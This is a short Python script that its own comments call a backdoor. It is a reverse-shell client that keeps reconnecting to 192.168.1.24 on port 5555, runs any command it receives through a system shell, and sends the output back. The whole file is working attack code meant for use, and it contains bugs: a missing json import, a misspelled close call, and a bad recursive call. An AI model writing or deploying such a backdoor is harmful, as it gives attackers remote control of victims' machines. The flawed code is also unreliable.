import socket
import time
import subprocess


# Create the socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Reliable receive function will get data back from the target
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


# Reliable send function will send the input command to the target system
def reliable_send(command):
    # Create the json data object from the command
    json_data = json.dumps(command)
    # Encode the data and then send it to the server
    sock.send(json_data.encode())


# Shell function will interact with the target shell
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        else:
            # Execute the command using a process and pipe
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # Read the data form stdout and/or stderr
            result = execute.stdout.read() + execute.stderr.read()
            # Decode the information
            result = result.decode()
            # Send the result
            reliable_send(result)


# Connection function connects to the correct port
def connection(sock):
    # Sleep for 20 seconds and then try to connect every 20 seconds
    while True:
        time.sleep(20)
        try:
            sock.connect(('192.168.1.24', 5555))
            shell()
            sock.slose()
            break
        except:
            connection()


# Main backdoor program
def main():
    # Connect to the server
    connection(sock)


if __name__ == '__main__':
    main()
